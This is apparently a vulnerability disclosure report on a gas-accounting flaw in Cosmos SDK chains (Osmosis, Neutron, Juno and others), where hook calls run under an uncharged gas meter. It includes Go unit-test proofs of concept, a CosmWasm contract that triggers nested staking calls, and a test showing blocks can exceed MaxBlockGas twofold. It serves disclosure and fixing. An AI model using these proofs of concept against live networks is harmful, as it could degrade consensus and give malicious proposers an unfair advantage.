# Pitfall 1

## Findings Summary

> See the [Per-Finding Index](../../README.md#per-finding-index) for the complete findings table with PoC types, fix status, and similarity values.

| # | Project | PoC Type | Issue Reference |
|---|---------|----------|-----------------|
| 1 | [Mantra](https://github.com/MANTRA-Chain/mantrachain) | UnitTest | [cosmos-sdk#25303](https://github.com/cosmos/cosmos-sdk/pull/25303) |
| 2 | [Osmosis](https://github.com/osmosis-labs/osmosis) | UnitTest | [osmosis#9511](https://github.com/osmosis-labs/osmosis/pull/9511) |
| 3 | [Neutron](https://github.com/neutron-org/neutron) | UnitTest | [neutron#978](https://github.com/neutron-org/neutron/pull/978) |
| 4 | [Tower](https://github.com/quasar-finance/quasar) | UnitTest | [before_send.go#L161](https://github.com/quasar-finance/quasar/blob/main/x/tokenfactory/keeper/before_send.go#L161) |
| 5 | [Phoenix](https://github.com/phoenix-directive/core) | UnitTest | [before_send.go#L144](https://github.com/jmesworld/core/blob/main/x/tokenfactory/keeper/before_send.go#L144) |
| 6 | [JMES](https://github.com/jmesworld/core) | UnitTest | [before_send.go#L144](https://github.com/jmesworld/core/blob/main/x/tokenfactory/keeper/before_send.go#L144) |
| 7 | [Symphony](https://github.com/Orchestra-Labs/symphony) | UnitTest | [before_send.go#L165](https://github.com/Orchestra-Labs/symphony/blob/main/x/tokenfactory/keeper/before_send.go#L165) |
| 8 | [Juno](https://github.com/CosmosContracts/juno) | UnitTest | [contracts.go#L70-L87](https://github.com/CosmosContracts/juno/blob/main/x/cw-hooks/keeper/contracts.go#L70-L87) |

---

<details>
<summary><b>Key Word Match</b></summary>

- For Github Search

`/\.withGasMeter/ AND /\.GasConsumed/ NOT /NewInfiniteGasMeter/ NOT path:ante language:Go`

- For chain-registry project we just use below match pattern to find out all candidate project, and manually check them one by one.

`/\.withGasMeter/`

</details>



## PoC


### PoC #1–#7: TokenFactory (Mantra, Osmosis, Neutron, Tower, Phoenix, JMES, Symphony)

A minimal reproduction would:

1. Use Mock's sudo to execute `callbeforeSendListener` to achieve any gas consumption that reaches the upper limit.
2. The initial value of the base ctx and the numerical state at the end of the final execution

The final execution result is 1435, but it should be 501_435 if everything correct.

```
SKIP_WASM_WSL_TESTS 
PASS
ok  	github.com/osmosis-labs/osmosis/v30/x/tokenfactory/keeper	0.964s
```

When I use the fix I gave above, the following return appears
```golang
Error:      	Should be true
Test:       	TestKeeperTestSuite/TestCallBeforeSendListener
Messages:   	BlockBeforeSend should consume gas, used: 501435
```
```golang
package keeper_test

import (
	"os"

	sdk "github.com/cosmos/cosmos-sdk/types"

	"github.com/osmosis-labs/osmosis/v30/x/tokenfactory/types"
)

// TestCallBeforeSendListener tests out of gas scenario
func (s *KeeperTestSuite) TestCallBeforeSendListener() {
	s.SkipIfWSL()

	s.SetupTest()

	// upload infinite loop wasm contract to trigger out of gas
	wasmCode, err := os.ReadFile("./testdata/infinite_track_beforesend.wasm")
	s.Require().NoError(err)
	codeID, _, err := s.contractKeeper.Create(s.Ctx, s.TestAccs[0], wasmCode, nil)
	s.Require().NoError(err)
	cosmwasmAddress, _, err := s.contractKeeper.Instantiate(s.Ctx, codeID, s.TestAccs[0], s.TestAccs[0], []byte("{}"), "", sdk.NewCoins())
	s.Require().NoError(err)

	// create factory denom
	res, err := s.msgServer.CreateDenom(s.Ctx, types.NewMsgCreateDenom(s.TestAccs[0].String(), "testcoin"))
	s.Require().NoError(err)
	denom := res.GetNewTokenDenom()

	// set before send hook
	_, err = s.msgServer.SetBeforeSendHook(s.Ctx, types.NewMsgSetBeforeSendHook(s.TestAccs[0].String(), denom, cosmwasmAddress.String()))
	s.Require().NoError(err)

	// measure gas consumption before and after BlockBeforeSend
	hooks := s.App.TokenFactoryKeeper.Hooks()
	amount := sdk.NewCoins(sdk.NewInt64Coin(denom, 100))

	// record gas consumed before calling BlockBeforeSend
	gasConsumedBefore := s.Ctx.GasMeter().GasConsumed()

	err = hooks.BlockBeforeSend(s.Ctx, s.TestAccs[0], s.TestAccs[1], amount)

	// record gas consumed after calling BlockBeforeSend
	gasConsumedAfter := s.Ctx.GasMeter().GasConsumed()
	gasUsed := gasConsumedAfter - gasConsumedBefore
	//  BeforeSendHookGasLimit = uint64(500_000)
	//  Correct gasUsed should be 501435
	s.Require().True(gasUsed == 1435, "BlockBeforeSend should consume gas, used: %d", gasUsed)
}

```

Same issue also find in concentrated-liquidity. plz remember review all .WithGasmeter usage!
#### Impact

- Consensus/Liveness degradation: Blocks can contain work far exceeding MaxGas while appearing cheap in accounting, extending block execution time.
- Economic impact: High allowing unfair proposer advantage. Specifically, malicious proposals can make it difficult for other proposers to complete Block verification by submitting bad blocks beyond MaxGas, thus making them miss their PrepareProposal windows, thereby improving the advantages of malicious Proposers to produce blocks in disguise.

### PoC #8: Juno

1. Add Below Test to you project
Add below test to cwhook `x/auth/keeper/msg_server_test.go`
```golang
func (s *KeeperTestSuite) TestContractExecution() {
	s.SetupTest()
	_, _, sender := testdata.KeyTestPubAddr()
	coin := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("ujuno", sdkmath.NewInt(1000000000000000000)))
	s.FundAcc(sender, coin)
	wasmCode, err := os.ReadFile("...wasm")//use the wasm path you compiled in below poc contract!
	contractAddress := s.InstantiateContract(sender.String(), "", wasmCode)

	c := types.Contract{
		ContractAddress: contractAddress,
	}
	_, err = s.msgServer.RegisterStaking(s.Ctx, &types.MsgRegisterStaking{
		ContractAddress: contractAddress,
		RegisterAddress: sender.String(),
	})
	coin2 := sdk.NewCoins(sdk.NewCoin("stake", sdkmath.NewInt(1000000000000000000)), sdk.NewCoin("ujuno", sdkmath.NewInt(1000000000000000000)))
	addr2, err := sdk.AccAddressFromBech32(contractAddress)
	s.FundAcc(addr2, coin2)
	s.Require().NoError(err)
	resp, err := s.queryClient.StakingContracts(s.Ctx, &types.QueryStakingContractsRequest{})
	s.Require().NoError(err)
	s.Require().Contains(resp.Contracts, c.ContractAddress)

	vals, err := s.stakingKeeper.GetValidators(s.Ctx, 1)
	s.Require().NoError(err)
	val := vals[0]

	// == Delegate Tokens ==
	s.Require().NoError(err)
	_, err = s.stakingKeeper.Delegate(s.Ctx, sender, sdkmath.NewInt(1), stakingtypes.Bonded, val, false)
	s.Require().NoError(err)
	// query the contract to get the last modified shares (delegation)
	panic("aa")
}
```

2. Compile the Below Contract which i already provided in `PoC.zip`

[PoC.zip](./default.zip)

```rust
#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::to_binary;
use cosmwasm_std::{BankMsg, StakingMsg};
use cosmwasm_std::{
    Binary, Coin, CosmosMsg, Deps, DepsMut, Env, MessageInfo, ReplyOn, Response, StdResult, SubMsg,
    Uint128,
};
use cw2::set_contract_version;

use crate::error::ContractError;
use crate::msg::{CallCountResponse, InstantiateMsg, QueryMsg, SudoMsg};
use crate::state::{CALL_COUNT,MAX_COUNT, CREATOR};
use cosmwasm_std::Reply;

// version info for migration info
const CONTRACT_NAME: &str = "crates.io:infinite-track-delegation-hook";
const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");

/// Handling contract instantiation
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    _msg: InstantiateMsg,
) -> Result<Response, ContractError> {
    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
    CREATOR.save(deps.storage, &info.sender)?;
    MAX_COUNT.save(deps.storage, &1)?;
    Ok(Response::new()
        .add_attribute("method", "instantiate")
        .add_attribute("creator", info.sender))
}

#[cfg_attr(not(feature = "library"), entry_point)]
pub fn sudo(deps: DepsMut, _env: Env, msg: SudoMsg) -> Result<Response, ContractError> {
    match msg {
        SudoMsg::AfterDelegationModified(del) => {
            let delegate_amount = Coin {
                denom: "ujuno".to_string(),
                amount: Uint128::new(1),
            };
            let cosmos_msg1 = CosmosMsg::Staking(StakingMsg::Delegate {
                validator: del.validator_address.clone(),
                amount: delegate_amount.clone(),
            });
            Ok(Response::new().add_message(cosmos_msg1.clone()).add_message(cosmos_msg1.clone()))
        }
        SudoMsg::BeforeDelegationSharesModified(del) => {
            let mut resp = Response::new();
            Ok(resp)
        }
    }
}
```

3. Setting breakpoints before and after the sudo execution to confirm the gas usage reveals that the gas for the nest call is not being recorded.



## Appendix

In addition to the issues discussed above, we identify a design weakness in the Cosmos SDK related to block-level gas enforcement. Specifically, the check against MaxBlockGas is performed in a deferred manner: transactions are fully executed and charged at the transaction level before their gas consumption is accumulated and checked against the block-level gas limit. As a result, a validator can include, as the last transaction in a block, a transaction whose declared transaction gas limit equals MaxBlockGas. This transaction is allowed to execute fully, even though the block has already consumed gas over the block limit. Consequently, the actual execution cost of the block can reach up to approximately 2 times MaxBlockGas, without causing the block to be rejected by consensus. Moreover, when this block-level gas accounting behavior is combined with the application-layer pitfalls described earlier, an attacker can further amplify the discrepancy between the enforced gas limits and the actual execution cost.

The proof-of-concept (PoC) demonstrating the Cosmos double-\texttt{MaxBlockGas} behavior is shown in the code below.
/cosmos-sdk/baseapp/report_test.go

```go
package baseapp_test

import (
	"testing"

	cmtproto "github.com/cometbft/cometbft/api/cometbft/types/v2"
	abci "github.com/cometbft/cometbft/v2/abci/types"
	"github.com/stretchr/testify/require"

	errorsmod "cosmossdk.io/errors"

	"github.com/cosmos/cosmos-sdk/baseapp"
	baseapptestutil "github.com/cosmos/cosmos-sdk/baseapp/testutil"
	sdk "github.com/cosmos/cosmos-sdk/types"
	sdkerrors "github.com/cosmos/cosmos-sdk/types/errors"
	"github.com/cosmos/cosmos-sdk/x/auth/ante"
)

func TestABCI_FinalizeBlock_GasLimit_WithNativeAnteHandler(t *testing.T) {
	blockGasLimit := int64(100) // Set a low block gas limit for testing

	anteOpt := func(bapp *baseapp.BaseApp) {
		// Use SetUpContextDecorator + custom gas consuming handler chain
		setupContextDecorator := ante.NewSetUpContextDecorator()

		// Custom handler that consumes gas for testing
		gasConsumingHandler := func(ctx sdk.Context, tx sdk.Tx, simulate bool) (sdk.Context, error) {
			// Get gas from transaction and consume it
			gasTx, ok := tx.(ante.GasTx)
			if !ok {
				return ctx, errorsmod.Wrap(sdkerrors.ErrTxDecode, "Tx must be GasTx")
			}

			// Consume gas to test block gas limits
			gasToConsume := gasTx.GetGas()
			if gasToConsume > 0 {
				ctx.GasMeter().ConsumeGas(gasToConsume, "test-gas-consumption")
			}

			return ctx, nil
		}

		// Chain the decorators
		bapp.SetAnteHandler(func(ctx sdk.Context, tx sdk.Tx, simulate bool) (sdk.Context, error) {
			// First run SetUpContextDecorator to set up gas meter
			newCtx, err := setupContextDecorator.AnteHandle(ctx, tx, simulate, gasConsumingHandler)
			if err != nil {
				return newCtx, err
			}
			return newCtx, nil
		})
	}
	suite := NewBaseAppSuite(t, anteOpt)
	baseapptestutil.RegisterCounterServer(suite.baseApp.MsgServiceRouter(), CounterServerImplGasMeterOnly{})

	_, err := suite.baseApp.InitChain(&abci.InitChainRequest{
		ConsensusParams: &cmtproto.ConsensusParams{
			Block: &cmtproto.BlockParams{
				MaxGas: blockGasLimit, // Block gas limit: 100
			},
		},
	})
	require.NoError(t, err)

	// First transaction: set gas limit to BlockGasLimit-1 = 99
	tx1 := newTxCounter(t, suite.txConfig, 0, 0) // counter=0, no messages
	builder1 := suite.txConfig.NewTxBuilder()
	require.NoError(t, builder1.SetMsgs(tx1.GetMsgs()...))
	builder1.SetMemo(tx1.GetMemo())
	builder1.SetGasLimit(99) // Set gas limit to 99
	setTxSignature(t, builder1, 0)
	tx1WithGas := builder1.GetTx()

	tx1Bytes, err := suite.txConfig.TxEncoder()(tx1WithGas)
	require.NoError(t, err)
	require.Equal(t, uint64(99), tx1WithGas.GetGas())

	// Second transaction: set gas limit to BlockGasLimit = 100
	tx2 := newTxCounter(t, suite.txConfig, 1, 0) // counter=1, no messages
	builder2 := suite.txConfig.NewTxBuilder()
	require.NoError(t, builder2.SetMsgs(tx2.GetMsgs()...))
	builder2.SetMemo(tx2.GetMemo())
	builder2.SetGasLimit(100) // Set gas limit to 100
	setTxSignature(t, builder2, 1)
	tx2WithGas := builder2.GetTx()

	tx2Bytes, err := suite.txConfig.TxEncoder()(tx2WithGas)
	require.NoError(t, err)
	require.Equal(t, uint64(100), tx2WithGas.GetGas())
	_, err = suite.baseApp.FinalizeBlock(&abci.FinalizeBlockRequest{
		Height: 1,
		Txs:    [][]byte{tx1Bytes, tx2Bytes},
	})
	require.NoError(t, err)
	ctx := getFinalizeBlockStateCtx(suite.baseApp)
	require.EqualValues(t, uint64(199), ctx.BlockGasMeter().GasConsumed())
}

```